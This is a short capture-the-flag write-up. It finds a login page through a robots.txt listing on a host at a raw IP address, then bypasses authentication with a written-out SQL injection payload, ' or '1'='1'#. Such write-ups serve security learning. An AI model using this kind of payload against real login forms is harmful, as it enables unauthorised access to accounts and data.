**This challenge was quite fascinating for me :)**

Steps to solve this challenge:
  1. Checking _robots.txt_ file of `188.40.189.2:8004` and the result is like this:
```
    User-agent: *
    Disallow: 
    /css/
    /fonts/
    /images/
    /js/
    /vendor/
    /login.php
```
  2. So we go to `login.php` and try to use **SQLi** to login
  3. I logged in with:
```
Username: ' or '1'='1'#
Password: admin
```
  4. Done :)
